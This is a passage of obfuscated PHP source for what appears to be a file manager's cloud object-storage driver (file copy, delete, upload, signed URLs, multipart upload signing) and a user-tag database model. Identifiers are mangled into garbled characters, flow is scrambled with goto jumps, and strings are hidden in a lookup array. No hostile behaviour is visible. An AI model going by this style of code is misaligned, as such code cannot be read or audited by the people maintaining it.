$C…šßÊïšª = $this->getBucketCors(); if (!$C…šßÊïšª || !is_array($C…šßÊïšª)) { return !1; } goto eÅËÍµ’; fäøóÂŸí: } public function mkfile($dí°ôŒÒ‚ğ, $e®Úì†àËÈ = '', $eŒíùŒáÃŠ = REPEAT_RENAME) { $Cê˜ÂŸÉ  = $this->setContent($dí°ôŒÒ‚ğ, $e®Úì†àËÈ); if ($Cê˜ÂŸÉ  !== !1) { return $this->getPathOuter($dí°ôŒÒ‚ğ); } return !1; } public function mkdir($C‰‰²Û, $D«ëÈÜ×ñ = REPEAT_SKIP) { if (empty($C‰‰²Û)) { return !1; } if ($this->_isFolder($C‰‰²Û)) { return $this->getPathOuter($C‰‰²Û); } $E‰Š«¤à´Ï = $this->setContent($C‰‰²Û, $_SERVER[Ö¹ñÒÁ²÷][33], !0); if ($E‰Š«¤à´Ï !== !1) { return $this->getPathOuter($C‰‰²Û); } return !1; } public function copyFile($b„·„¿”ãæ, $e‹–¼Ôê«Ø, $c®ô‘–ªÏ = array()) { $eéáª¾©®½ =& $_SERVER[Ö¹ñÒÁ²÷]; $e¡ŞèÅØÎî = $this->objectMeta($b„·„¿”ãæ); if (!$e¡ŞèÅØÎî) { return !1; } if ($e¡ŞèÅØÎî[$eéáª¾©®½[77]] <= 1024 * 1024 * 200) { $f‘•ë”­îš = $this->client->copyObject($this->bucket, $b„·„¿”ãæ, $this->bucket, $e‹–¼Ôê«Ø, $eéáª¾©®½[181], $c®ô‘–ªÏ); } else { $f‘•ë”­îš = $this->client->multiCopyObject($this->bucket, $b„·„¿”ãæ, $this->bucket, $e‹–¼Ôê«Ø, $c®ô‘–ªÏ); } $f‘•ë”­îš = $f‘•ë”­îš ? $this->getPathOuter($e‹–¼Ôê«Ø) : !1; return $f‘•ë”­îš; } public function moveFile($cÙŠÅÈ«¿, $båÈ¢…Ü±¬) { if ($this->copyFile($cÙŠÅÈ«¿, $båÈ¢…Ü±¬)) { $this->delFile($cÙŠÅÈ«¿); return $this->getPathOuter($båÈ¢…Ü±¬); } return !1; } public function delFile($cµÎšŠÂÀÛ) { return $this->client->deleteObject($this->bucket, $cµÎšŠÂÀÛ); } public function delFolder($bçïŸŠ¤âÄ) { goto CË¾ÏŠ°œ²; CË¾ÏŠ°œ²: $cÚ‡„ìªØŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $fÔİŠÛáº = $this->listObjs($bçïŸŠ¤âÄ); if (!$fÔİŠÛáº) { $bçïŸŠ¤âÄ = trim($bçïŸŠ¤âÄ, $cÚ‡„ìªØŞ[8]); if (!empty($bçïŸŠ¤âÄ)) { $bçïŸŠ¤âÄ .= $cÚ‡„ìªØŞ[8]; } return $this->delFile($bçïŸŠ¤âÄ); } goto a‹·¦àÈŞÄ; a°ˆ¿•Æ„: return $DÉ²«â”‘ === $Bíğ÷±Ï‚÷ ? !0 : !1; goto d«ÉùøÔ¥Õ; a‹·¦àÈŞÄ: $DÉ²«â”‘ = $Bíğ÷±Ï‚÷ = 0; $DòÄ™ÄÁ‰© = array_chunk(array_keys($fÔİŠÛáº), 1000); foreach ($DòÄ™ÄÁ‰© as $Cë–Ùó´¿ß) { $DÉ²«â”‘++; $Bíğ÷±Ï‚÷ += (int) $this->client->deleteObjects($this->bucket, $Cë–Ùó´¿ß); } goto a°ˆ¿•Æ„; d«ÉùøÔ¥Õ: } public function rename($e§µØ×ÊÜÃ, $b´¬Ä¦Ãˆ) { return $this->renameObject($e§µØ×ÊÜÃ, $b´¬Ä¦Ãˆ); } public function listPath($eÒô–šŠ‹…, $eåŸ‚“îŠ = false) { $BùÓ¦Üğùó =& $_SERVER[Ö¹ñÒÁ²÷]; $F‰Ğˆ‡™£î = $this->listObjs($eÒô–šŠ‹…, null, null, $BùÓ¦Üğùó[8]); $BŠ„ôĞ¬Á = array($BùÓ¦Üğùó[74] => array(), $BùÓ¦Üğùó[73] => array()); foreach ($F‰Ğˆ‡™£î as $f×›Ê”Æ¡ => $a±É£Ñ„ˆ) { if ($f×›Ê”Æ¡ == $BùÓ¦Üğùó[8]) { continue; } if (isset($a±É£Ñ„ˆ[$BùÓ¦Üğùó[182]])) { $BŠ„ôĞ¬Á[$BùÓ¦Üğùó[74]][] = $this->folderInfo($a±É£Ñ„ˆ[$BùÓ¦Üğùó[182]], $eåŸ‚“îŠ); } else { if (substr($a±É£Ñ„ˆ[$BùÓ¦Üğùó[28]], -1) == $BùÓ¦Üğùó[8]) { continue; } $BŠ„ôĞ¬Á[$BùÓ¦Üğùó[73]][] = $this->fileInfo($a±É£Ñ„ˆ[$BùÓ¦Üğùó[28]], $eåŸ‚“îŠ, $a±É£Ñ„ˆ); } } return $BŠ„ôĞ¬Á; } private function fileInfo($dóº¿òÄÈ­, $E’åîÎË˜ = false, $CÇ­Ÿ„¢È’ = array()) { goto dÛÑÑÎº; aä¹ğùâù: return $EØá´ÊŠÇ; goto Fî„‘™­Ì; dÛÑÑÎº: $açÉ¨ˆ£ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($E’åîÎË˜) { return array($açÉ¨ˆ£[28] => $this->pathThis($dóº¿òÄÈ­), $açÉ¨ˆ£[75] => $this->getPathOuter($dóº¿òÄÈ­), $açÉ¨ˆ£[29] => $açÉ¨ˆ£[163], $açÉ¨ˆ£[156] => $this->ext($dóº¿òÄÈ­), $açÉ¨ˆ£[77] => isset($CÇ­Ÿ„¢È’[$açÉ¨ˆ£[77]]) ? $CÇ­Ÿ„¢È’[$açÉ¨ˆ£[77]] : 0, $açÉ¨ˆ£[183] => 0, $açÉ¨ˆ£[106] => 0, $açÉ¨ˆ£[184] => !0, $açÉ¨ˆ£[185] => !0); } $EØá´ÊŠÇ = array($açÉ¨ˆ£[28] => $this->pathThis($dóº¿òÄÈ­), $açÉ¨ˆ£[75] => $this->getPathOuter($dóº¿òÄÈ­), $açÉ¨ˆ£[29] => $açÉ¨ˆ£[163], $açÉ¨ˆ£[183] => 0, $açÉ¨ˆ£[106] => 0, $açÉ¨ˆ£[77] => 0, $açÉ¨ˆ£[156] => $this->ext($dóº¿òÄÈ­), $açÉ¨ˆ£[184] => !0, $açÉ¨ˆ£[185] => !0); goto fŸ¼×“³½‹; fŸ¼×“³½‹: if (empty($CÇ­Ÿ„¢È’)) { $CÇ­Ÿ„¢È’ = $this->objectMeta($dóº¿òÄÈ­); if (!$CÇ­Ÿ„¢È’) { return $EØá´ÊŠÇ; } } if (isset($CÇ­Ÿ„¢È’[$açÉ¨ˆ£[186]])) { $EØá´ÊŠÇ[$açÉ¨ˆ£[106]] = $CÇ­Ÿ„¢È’[$açÉ¨ˆ£[186]]; } if (isset($CÇ­Ÿ„¢È’[$açÉ¨ˆ£[77]])) { $EØá´ÊŠÇ[$açÉ¨ˆ£[77]] = $CÇ­Ÿ„¢È’[$açÉ¨ˆ£[77]]; } goto aä¹ğùâù; Fî„‘™­Ì: } private function folderInfo($aÂìğó¥Ÿ, $E†´ŒòŞÑŸ = false) { goto DéèÖ…Ç¬â; fÅÉ†ôÜç: if ($aÂìğó¥Ÿ == $Dµİ©ìš­¤[33]) { return $aÁÒ¦‚­õõ; } $aÂìğó¥Ÿ = trim($aÂìğó¥Ÿ, $Dµİ©ìš­¤[8]) . $Dµİ©ìš­¤[8]; $DÀĞå˜²×” = $this->objectMeta($aÂìğó¥Ÿ); goto E©‹ŠÇ»¿‡; E©‹ŠÇ»¿‡: if (isset($DÀĞå˜²×”[$Dµİ©ìš­¤[186]])) { $aÁÒ¦‚­õõ[$Dµİ©ìš­¤[183]] = $DÀĞå˜²×”[$Dµİ©ìš­¤[186]]; } return $aÁÒ¦‚­õõ; goto BàÌò•†Ü; DéèÖ…Ç¬â: $Dµİ©ìš­¤ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($E†´ŒòŞÑŸ) { return array($Dµİ©ìš­¤[28] => $this->pathThis($aÂìğó¥Ÿ), $Dµİ©ìš­¤[75] => $this->getPathOuter($Dµİ©ìš­¤[8] . $aÂìğó¥Ÿ), $Dµİ©ìš­¤[29] => $Dµİ©ìš­¤[76], $Dµİ©ìš­¤[184] => !0, $Dµİ©ìš­¤[185] => !0); } $aÁÒ¦‚­õõ = array($Dµİ©ìš­¤[28] => $this->pathThis($aÂìğó¥Ÿ), $Dµİ©ìš­¤[75] => $this->getPathOuter($Dµİ©ìš­¤[8] . $aÂìğó¥Ÿ), $Dµİ©ìš­¤[29] => $Dµİ©ìš­¤[76], $Dµİ©ìš­¤[183] => 0, $Dµİ©ìš­¤[106] => 0, $Dµİ©ìš­¤[184] => !0, $Dµİ©ìš­¤[185] => !0); goto fÅÉ†ôÜç; BàÌò•†Ü: } public function listObjs($Fİ¬‘âÇöê, $A°ßËÈ”ø‡ = null, $DÄ¾¬êùÃÆ = null, $e„šØÉá¿ = null) { $F¡‰Š„¶‚† =& $_SERVER[Ö¹ñÒÁ²÷]; $Fİ¬‘âÇöê = trim($Fİ¬‘âÇöê, $F¡‰Š„¶‚†[8]); $d¯öÇ‰à©Ä = empty($Fİ¬‘âÇöê) ? $F¡‰Š„¶‚†[33] : $Fİ¬‘âÇöê . $F¡‰Š„¶‚†[8]; return $this->client->getBucket($this->bucket, $d¯öÇ‰à©Ä, $A°ßËÈ”ø‡, $DÄ¾¬êùÃÆ, $e„šØÉá¿, !0); } public function has($EÔ–È¦ä‹, $cˆŸ´ˆš…Ò = false, $d˜Á¨³»êî = true) { goto Bº¼èˆÄƒ; cë‰¼òÀ«™: if ($cˆŸ´ˆš…Ò) { return array($eƒ¾Öàğ°[187] => $eù«£º¬Ÿ, $eƒ¾Öàğ°[188] => $CÀˆÛ‹­î©); } return !1; goto b°·—Å¥À¹; Bº¼èˆÄƒ: $eƒ¾Öàğ° =& $_SERVER[Ö¹ñÒÁ²÷]; $eù«£º¬Ÿ = 0; $CÀˆÛ‹­î© = 0; goto B´™Ó±Ø; B´™Ó±Ø: $bßÉ½àÜ‚‘ = $this->listObjs($EÔ–È¦ä‹, null, null, $eƒ¾Öàğ°[8]); $bßÉ½àÜ‚‘ = is_array($bßÉ½àÜ‚‘) ? $bßÉ½àÜ‚‘ : array(); foreach ($bßÉ½àÜ‚‘ as $a¢Úøš§İ¶) { if (isset($a¢Úøš§İ¶[$eƒ¾Öàğ°[28]]) && substr($a¢Úøš§İ¶[$eƒ¾Öàğ°[28]], -1) != $eƒ¾Öàğ°[8]) { if (!$cˆŸ´ˆš…Ò && $d˜Á¨³»êî) { return !0; } $eù«£º¬Ÿ++; } else { if (isset($a¢Úøš§İ¶[$eƒ¾Öàğ°[182]])) { if (!$cˆŸ´ˆš…Ò && !$d˜Á¨³»êî) { return !1; } $CÀˆÛ‹­î©++; } } } goto cë‰¼òÀ«™; b°·—Å¥À¹: } public function listAll($DÁ³¼µ®¹Ô) { $E„›Ü¥Ë¾ =& $_SERVER[Ö¹ñÒÁ²÷]; $b·ï“ÍŞÜ¨ = $this->listObjs($DÁ³¼µ®¹Ô); $Aç«äëáƒ¡ = $b™ö‚…Ñ÷† = array(); foreach ($b·ï“ÍŞÜ¨ as $a£ãÓ¢Ìº => $b¸İÚòÕ¶Î) { $Aç«äëáƒ¡[] = $b¸İÚòÕ¶Î[$E„›Ü¥Ë¾[28]]; $b™ö‚…Ñ÷†[$a£ãÓ¢Ìº] = $b¸İÚòÕ¶Î[$E„›Ü¥Ë¾[77]]; } return $this->listAllFiles($DÁ³¼µ®¹Ô, $Aç«äëáƒ¡, $b™ö‚…Ñ÷†); } public function canRead($CË»ÜÁ¾Ü) { $b‰¾°Å½¦ =& $_SERVER[Ö¹ñÒÁ²÷]; $DÈ«İ–ËÕ = $this->client->getAccessControlPolicy($this->bucket, $CË»ÜÁ¾Ü); if (!$DÈ«İ–ËÕ) { return !1; } return in_array($DÈ«İ–ËÕ, array($b‰¾°Å½¦[189], $b‰¾°Å½¦[190], $b‰¾°Å½¦[191])) ? !0 : !1; } public function canWrite($bÍñÎ‡Õ¯•) { $a‘¡·ĞÙ» =& $_SERVER[Ö¹ñÒÁ²÷]; $AÂµ­ÁÅë„ = $this->client->getAccessControlPolicy($this->bucket, $bÍñÎ‡Õ¯•); if (!$AÂµ­ÁÅë„) { return !1; } return in_array($AÂµ­ÁÅë„, array($a‘¡·ĞÙ»[189], $a‘¡·ĞÙ»[190])) ? !0 : !1; } public function getContent($cÖ·á¾øÔ) { return $this->client->getObject($this->bucket, $cÖ·á¾øÔ); } public function setContent($c«äÃÈ÷ŠŠ, $cæÄø‡„™ = '', $Aõï–ñë¯î = false) { goto aÏñÀ’Œ†Ş; E™»ãÙÉšš: $BìÑÛ¶ß›Å = $this->client->putObject($cæÄø‡„™, $this->bucket, $c«äÃÈ÷ŠŠ, $FøíĞ‘æ†[181], array(), $C„ ÓÃ÷„¥); if (!$BìÑÛ¶ß›Å) { return !1; } if ($Aõï–ñë¯î) { return !0; } goto EŞÃÄÓŸ¸é; EŞÃÄÓŸ¸é: $BìÑÛ¶ß›Å = $this->copyFile($c«äÃÈ÷ŠŠ, $c«äÃÈ÷ŠŠ, array($FøíĞ‘æ†[192] => $BìÑÛ¶ß›Å[$FøíĞ‘æ†[193]])); return $BìÑÛ¶ß›Å ? !0 : !1; goto fˆİ¶¯õöƒ; aÏñÀ’Œ†Ş: $FøíĞ‘æ† =& $_SERVER[Ö¹ñÒÁ²÷]; $c«äÃÈ÷ŠŠ = $Aõï–ñë¯î ? trim($c«äÃÈ÷ŠŠ, $FøíĞ‘æ†[8]) . $FøíĞ‘æ†[8] : $c«äÃÈ÷ŠŠ; $C„ ÓÃ÷„¥ = get_file_mime(get_path_ext($c«äÃÈ÷ŠŠ)); goto E™»ãÙÉšš; fˆİ¶¯õöƒ: } public function fileSubstr($B›ÂáàŒæ, $E¹ÉîºÏ¯«, $a‚¸ğ¯Š‘ˆ) { $AØÍåø‘·è = $E¹ÉîºÏ¯« + $a‚¸ğ¯Š‘ˆ - 1; return $this->client->getObject($this->bucket, $B›ÂáàŒæ, array($_SERVER[Ö¹ñÒÁ²÷][194] => "\x62\x79\164\x65\163\75{$E¹ÉîºÏ¯«}\x2d{$AØÍåø‘·è}")); } public function upload($bˆ¡íìöØ—, $Dæô¯…””, $D•¦ƒ£†ø = false, $bŞõ•Áè‘š = REPEAT_REPLACE) { $e†ê¼ßÈÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $Dó¶¾Ë¹Ê¤ = array($e†ê¼ßÈÑ[192] => @md5_file($Dæô¯…””)); $f¢Ÿ¡ĞİÕ« = array($e†ê¼ßÈÑ[195] => get_file_mime(get_path_ext($bˆ¡íìöØ—))); if (IO::size($Dæô¯…””) <= 1024 * 1024 * 200) { $eŠŒ›‚²‚ê = $this->client->putObjectFile($Dæô¯…””, $this->bucket, $bˆ¡íìöØ—, $e†ê¼ßÈÑ[181], $Dó¶¾Ë¹Ê¤, $f¢Ÿ¡ĞİÕ«); return !empty($eŠŒ›‚²‚ê) ? $this->getPathOuter($bˆ¡íìöØ—) : !1; } $AÜÑ‡ƒÚ˜´ = $this->client->multiUploadObject($Dæô¯…””, $this->bucket, trim($bˆ¡íìöØ—, $e†ê¼ßÈÑ[8]), $Dó¶¾Ë¹Ê¤, $f¢Ÿ¡ĞİÕ«); return $AÜÑ‡ƒÚ˜´ ? $this->getPathOuter($bˆ¡íìöØ—) : !1; } public function download($CôèâÉô‚Ã, $a¿Úí­Ï×à) { if (!@is_dir($this->pathFather($a¿Úí­Ï×à)) && !IO::mkdir($this->pathFather($a¿Úí­Ï×à))) { return !1; } $e‰æ‹…àÓÀ = $this->client->getObject($this->bucket, $CôèâÉô‚Ã, array(), $a¿Úí­Ï×à); return $e‰æ‹…àÓÀ !== !1 ? $a¿Úí­Ï×à : !1; } public function link($a¤¶·Ü‰Å÷, $FÁÄ…‹­á = array()) { $aŠóàêÅ´ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->signVer == $aŠóàêÅ´[196]) { return $this->client->getAuthenticatedURL($this->bucket, $a¤¶·Ü‰Å÷, 3600 * 12, $FÁÄ…‹­á); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($a¤¶·Ü‰Å÷, $aŠóàêÅ´[8]), 3600 * 12, $this->region, array(), !0, $FÁÄ…‹­á); } public function fileOut($aÄêÅÙ™Ø, $BİíŞÓ¸™ = false, $cİî¿£—÷³ = false, $EË× ‘ˆÓÓ = '') { goto f§í†Ä¯øƒ; fÑİ ‚®™ç: if ($DŞÍ¶’İ¤Ñ == $c§áãÄÅ…‚[197]) { return parent::fileOut($aÄêÅÙ™Ø, $BİíŞÓ¸™, $cİî¿£—÷³, $EË× ‘ˆÓÓ); } $BİíŞÓ¸™ = $BİíŞÓ¸™ ? $c§áãÄÅ…‚[198] : $c§áãÄÅ…‚[199]; $aÅÏ¬Ó‚Ÿë = array($c§áãÄÅ…‚[200] => $BİíŞÓ¸™ . $c§áãÄÅ…‚[201] . rawurlencode($cİî¿£—÷³), $c§áãÄÅ…‚[202] => $DŞÍ¶’İ¤Ñ); goto C“ÀœÑÌøí; f§í†Ä¯øƒ: $c§áãÄÅ…‚ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$cİî¿£—÷³) { $cİî¿£—÷³ = $this->pathThis($aÄêÅÙ™Ø); } $DŞÍ¶’İ¤Ñ = get_file_mime(get_path_ext($cİî¿£—÷³)); goto fÑİ ‚®™ç; C“ÀœÑÌøí: $aó§½­ß  = $this->link($aÄêÅÙ™Ø, $aÅÏ¬Ó‚Ÿë); $this->fileOutLink($aó§½­ß ); goto bÊ‚Ùù®ªÑ; bÊ‚Ùù®ªÑ: } public function fileOutServer($a’Ğ°­¿Ç´, $aÌ»èÓµÁó = false, $BÇ¥Í±’•Ø = false, $cë§›Ë©ŒÃ = '') { parent::fileOut($a’Ğ°­¿Ç´, $aÌ»èÓµÁó, $BÇ¥Í±’•Ø, $cë§›Ë©ŒÃ); } public function fileOutImage($A‰³¡‰ÁŒ×, $D®‹ã©ôƒ› = 250) { $fó¾…Àçè° = $this->link($A‰³¡‰ÁŒ×); $this->fileOutLink($fó¾…Àçè°); } public function fileOutImageServer($EÒÂ£¼İÙ‰, $D¼‡¯›…í = 250) { parent::fileOutImage($EÒÂ£¼İÙ‰, $D¼‡¯›…í); } public function hashMd5($DÒÉá»Ô‚ï, $B¥‰…–‰¯¿ = '') { $f¨ÑÀ Ó¥é =& $_SERVER[Ö¹ñÒÁ²÷]; $B¯‘åÓ“·Ş = $this->objectMeta($DÒÉá»Ô‚ï); if (!$B¯‘åÓ“·Ş) { return !1; } $B¥‰…–‰¯¿ = $B¥‰…–‰¯¿ ? $B¥‰…–‰¯¿ : _get($B¯‘åÓ“·Ş, $f¨ÑÀ Ó¥é[203]); $B¥‰…–‰¯¿ = $B¥‰…–‰¯¿ ? $B¥‰…–‰¯¿ : _get($B¯‘åÓ“·Ş, $f¨ÑÀ Ó¥é[193], $f¨ÑÀ Ó¥é[33]); return $B¥‰…–‰¯¿; } public function uploadFormData($EÃÄğ‘Ö¯¿, $e—ÜğÍ„À = 3600) { $bÚ­­øçœÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $d­Ä§Œ¾×ˆ = $this->pathFather($EÃÄğ‘Ö¯¿); $B§ ÖÉ£¶Û = $this->client->getHttpUploadPostParams($this->bucket, $d­Ä§Œ¾×ˆ, $bÚ­­øçœÑ[181], $e—ÜğÍ„À); return array_merge((array) $B§ ÖÉ£¶Û, array($bÚ­­øçœÑ[165] => $this->getHost())); } public function multiUploadFormData($DåßŸğæºŠ, $d‹‡‹˜¼§½ = 3600) { $c‘ã‹£†í˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $DÙ£œÃÏÅ = gmdate($c‘ã‹£†í˜[204]); $B¬¯¹’‚Ë = array(); $FùŠÁ²àÎ– = $this->client->getUploadId($this->bucket, $DåßŸğæºŠ, $B¬¯¹’‚Ë); if (!$FùŠÁ²àÎ–) { return !1; } return array($c‘ã‹£†í˜[205] => $FùŠÁ²àÎ–, $c‘ã‹£†í˜[165] => $this->getHost() . $c‘ã‹£†í˜[8] . $this->pathEncode($DåßŸğæºŠ), $c‘ã‹£†í˜[206] => $DÙ£œÃÏÅ, $c‘ã‹£†í˜[89] => $DåßŸğæºŠ); } public function multiUploadAuthData($BŸò¥Ğ©¯ˆ, $DåÏ‰‰Øš™ = array()) { goto a†ó†ˆ•‡í; F¼£ÇóÑ»‡: if (strpos($Fï®Ùğí›º, $FÍ¹™ËÆ´[209]) === 0) { return array($FÍ¹™ËÆ´[216] => $cÈ¥ïß¶, $FÍ¹™ËÆ´[206] => $FïÃ¨°ƒ); } return $cÈ¥ïß¶; goto fÑ°ÚÆÕİÙ; cºº­™³‡Æ: $Bˆ¾ÇİÇ¯Ÿ = array($FÍ¹™ËÆ´[208], $FÍ¹™ËÆ´[33], $FÍ¹™ËÆ´[115], $FÍ¹™ËÆ´[33], "\x78\55\x61\x6d\x7a\x2d\144\x61\x74\x65\72{$FïÃ¨°ƒ}", $FÍ¹™ËÆ´[8] . $this->bucket . $FÍ¹™ËÆ´[8] . $this->pathEncode($d‘ºâš´‹Ë) . $Fï®Ùğí›º); if (strpos($Fï®Ùğí›º, $FÍ¹™ËÆ´[209]) === 0) { $Bˆ¾ÇİÇ¯Ÿ[0] = $FÍ¹™ËÆ´[210]; } if (isset($DåÏ‰‰Øš™[$FÍ¹™ËÆ´[211]]) && $DåÏ‰‰Øš™[$FÍ¹™ËÆ´[211]] == $FÍ¹™ËÆ´[212]) { $Bˆ¾ÇİÇ¯Ÿ[0] = $FÍ¹™ËÆ´[212]; } goto câ¢ÎÛ†¸¢; câ¢ÎÛ†¸¢: $c‚ÇÅ½„ç = implode($FÍ¹™ËÆ´[213], $Bˆ¾ÇİÇ¯Ÿ); $AŠİ‰Ô×ƒ = base64_encode(hash_hmac($FÍ¹™ËÆ´[214], $c‚ÇÅ½„ç, $this->secret, !0)); $cÈ¥ïß¶ = $FÍ¹™ËÆ´[215] . $this->accessKey . $FÍ¹™ËÆ´[4] . $AŠİ‰Ô×ƒ; goto F¼£ÇóÑ»‡; A¡Û¹É½ê§: $d‘ºâš´‹Ë = $DåÏ‰‰Øš™[$FÍ¹™ËÆ´[89]]; unset($DåÏ‰‰Øš™[$FÍ¹™ËÆ´[89]]); if (isset($DåÏ‰‰Øš™[$FÍ¹™ËÆ´[207]])) { $DåÏ‰‰Øš™[$FÍ¹™ËÆ´[206]] = $FïÃ¨°ƒ; return $this->listUploadParts($d‘ºâš´‹Ë, $DåÏ‰‰Øš™); } goto cºº­™³‡Æ; a†ó†ˆ•‡í: $FÍ¹™ËÆ´ =& $_SERVER[Ö¹ñÒÁ²÷]; $FïÃ¨°ƒ = isset($DåÏ‰‰Øš™[$FÍ¹™ËÆ´[206]]) ? $DåÏ‰‰Øš™[$FÍ¹™ËÆ´[206]] : gmdate($FÍ¹™ËÆ´[204]); $Fï®Ùğí›º = isset($DåÏ‰‰Øš™[$FÍ¹™ËÆ´[156]]) ? $DåÏ‰‰Øš™[$FÍ¹™ËÆ´[156]] : $FÍ¹™ËÆ´[33]; goto A¡Û¹É½ê§; fÑ°ÚÆÕİÙ: } public function listUploadParts($ešï·ØŒ¦º, $b‹Ôœø¾ÒÓ = array()) { goto D‰œÚÒ’òÔ; D‰œÚÒ’òÔ: $bƒÂâ¬¿ù =& $_SERVER[Ö¹ñÒÁ²÷]; $D”ØôÅòÒè = str_replace($bƒÂâ¬¿ù[217], $bƒÂâ¬¿ù[33], $b‹Ôœø¾ÒÓ[$bƒÂâ¬¿ù[156]]); $fö…Äóù = $this->client->listParts($this->bucket, $ešï·ØŒ¦º, $D”ØôÅòÒè); goto FäÉ–’óÏ; FäÉ–’óÏ: if (!$fö…Äóù) { return !1; } unset($b‹Ôœø¾ÒÓ[$bƒÂâ¬¿ù[207]], $b‹Ôœø¾ÒÓ[$bƒÂâ¬¿ù[211]]); $b‹Ôœø¾ÒÓ[$bƒÂâ¬¿ù[89]] = $ešï·ØŒ¦º; goto D­ˆö³à’ã; D­ˆö³à’ã: $Fœçä©½µ = $this->multiUploadAuthData($ešï·ØŒ¦º, $b‹Ôœø¾ÒÓ); if (empty($Fœçä©½µ)) { return !1; } return array($bƒÂâ¬¿ù[216] => $Fœçä©½µ, $bƒÂâ¬¿ù[206] => $b‹Ôœø¾ÒÓ[$bƒÂâ¬¿ù[206]], $bƒÂâ¬¿ù[218] => $fö…Äóù); goto A˜°á£Ÿ´; A˜°á£Ÿ´: } public function getHost() { return parent::getHost() . $_SERVER[Ö¹ñÒÁ²÷][8] . $this->bucket; } public function size($d×ÛƒÉãÖ) { $BÚ—¿”ÑŞÈ = $this->objectMeta($d×ÛƒÉãÖ); return $BÚ—¿”ÑŞÈ ? $BÚ—¿”ÑŞÈ[$_SERVER[Ö¹ñÒÁ²÷][77]] : 0; } public function info($DµÚ¢™Ş¹Ñ) { if ($this->isFolder($DµÚ¢™Ş¹Ñ)) { return $this->folderInfo($DµÚ¢™Ş¹Ñ); } else { if ($this->isFile($DµÚ¢™Ş¹Ñ)) { return $this->fileInfo($DµÚ¢™Ş¹Ñ); } } return !1; } public function exist($d¡ÁÆæ²ÆË) { return $this->isFile($d¡ÁÆæ²ÆË) || $this->isFolder($d¡ÁÆæ²ÆË); } public function isFile($A¥òîÌÅ‘¼) { return !$this->isFolder($A¥òîÌÅ‘¼) && $this->objectMeta($A¥òîÌÅ‘¼); } public function isFolder($d¢÷¬ô×Ô) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][219], $d¢÷¬ô×Ô); } protected function objectMeta($f‘ìƒ‡ŒÆ™) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][220], $f‘ìƒ‡ŒÆ™); } protected function _objectMeta($CÛÉì³á†‚) { $fêËÉ¤›éº =& $_SERVER[Ö¹ñÒÁ²÷]; $CÛÉì³á†‚ = rtrim($CÛÉì³á†‚, $fêËÉ¤›éº[8]); try { $Aº…ÇƒìÊ = $this->client->getObjectInfo($this->bucket, $CÛÉì³á†‚); if (!isset($Aº…ÇƒìÊ[$fêËÉ¤›éº[203]]) && isset($Aº…ÇƒìÊ[$fêËÉ¤›éº[221]])) { $Aº…ÇƒìÊ[$fêËÉ¤›éº[203]] = $Aº…ÇƒìÊ[$fêËÉ¤›éº[221]]; } } catch (OSS\Core\OssException $fæ§·è„¿¨) { $Aº…ÇƒìÊ = !1; } if (!$Aº…ÇƒìÊ) { } return $Aº…ÇƒìÊ; } protected function _isFolder($d¢ƒ±ŠïÏŒ) { goto D†æùë‚•ì; D“êÂùÉìÆ: if (substr($CÖåÍ „Ã[0][$f‚Êº™­[28]], -1) == $f‚Êº™­[8]) { return !0; } if (get_path_this($CÖåÍ „Ã[0][$f‚Êº™­[28]]) == get_path_this($d¢ƒ±ŠïÏŒ)) { return !1; } return !0; goto Cé‡Ü½ˆ²œ; AÛ±‡ï¸Å: $CÖåÍ „Ã = $this->client->getBucket($this->bucket, $d¢ƒ±ŠïÏŒ, null, 1); if (empty($CÖåÍ „Ã)) { return !1; } $CÖåÍ „Ã = array_values($CÖåÍ „Ã); goto D“êÂùÉìÆ; D†æùë‚•ì: $f‚Êº™­ =& $_SERVER[Ö¹ñÒÁ²÷]; $d¢ƒ±ŠïÏŒ = rtrim($d¢ƒ±ŠïÏŒ, $f‚Êº™­[8]); if ($d¢ƒ±ŠïÏŒ == $f‚Êº™­[33] || $d¢ƒ±ŠïÏŒ == $f‚Êº™­[8]) { return !0; } goto AÛ±‡ï¸Å; Cé‡Ü½ˆ²œ: } } define($_SERVER[Ö¹ñÒÁ²÷][222], 1); goto e¼ªÃÜËŞ±; a‚…ó¶ï: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($EÂä—·«šÏ) { $bØ‚±„À»Á =& $_SERVER[Ö¹ñÒÁ²÷]; return array($bØ‚±„À»Á[2461] => array(USER_ID, $bØ‚±„À»Á[2517])); } protected function listData() { $BÜîéØîå =& $_SERVER[Ö¹ñÒÁ²÷]; $DÂ¦°ç¹Œ = array($BÜîéØîå[1406] => USER_ID, $BÜîéØîå[432] => array($BÜîéØîå[2518], 0)); $bæåİ ÏÂ = $BÜîéØîå[2519]; $f•±×Ù‰†‰ = $BÜîéØîå[2520]; $F…ï¶ìŒÇ = $this->field($bæåİ ÏÂ)->where($DÂ¦°ç¹Œ)->order($f•±×Ù‰†‰)->select(); return $F…ï¶ìŒÇ ? $F…ï¶ìŒÇ : array(); } protected function listByTag($FÉ³èßœÜ˜) { } protected function addToTag($fÆ„Ä§ù”Ö, $cÃ„‹ğğ‰²) { $cĞÛ¶‹äÉ• =& $_SERVER[Ö¹ñÒÁ²÷]; if (!Model($cĞÛ¶‹äÉ•[2288])->listData($cÃ„‹ğğ‰²) || !Model($cĞÛ¶‹äÉ•[749])->pathInfo($fÆ„Ä§ù”Ö)) { return !1; } $AØ£ëƒØ¨† = array($cĞÛ¶‹äÉ•[1406] => USER_ID, $cĞÛ¶‹äÉ•[432] => $cÃ„‹ğğ‰², $cĞÛ¶‹äÉ•[383] => $fÆ„Ä§ù”Ö, $cĞÛ¶‹äÉ•[384] => $cĞÛ¶‹äÉ•[378], $cĞÛ¶‹äÉ•[382] => $cĞÛ¶‹äÉ•[33], $cĞÛ¶‹äÉ•[2083] => 0); if ($this->where($AØ£ëƒØ¨†)->find()) { return !1; } return $this->add($AØ£ëƒØ¨†); } protected function removeFromTag($fì“ğğáÕÅ, $Eœëƒ¿«Ò) { $bİ†ãĞ¬ò¼ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!Model($bİ†ãĞ¬ò¼[2288])->listData($Eœëƒ¿«Ò)) { return !1; } if 